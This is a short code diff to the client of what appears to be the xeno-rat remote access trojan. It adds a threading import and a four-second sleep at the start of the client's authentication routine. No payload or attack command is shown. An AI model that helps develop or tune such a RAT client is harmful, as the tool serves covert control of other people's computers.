@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -122,6 +123,7 @@ namespace xeno_rat_client
         }
         public async Task<bool> AuthenticateAsync(int type, int id = 0, byte[] sysInfo = null)//0 = main, 1 = heartbeat, 2 = anything else
         {
+            Thread.Sleep(4000);
             byte[] data;
             try
             {
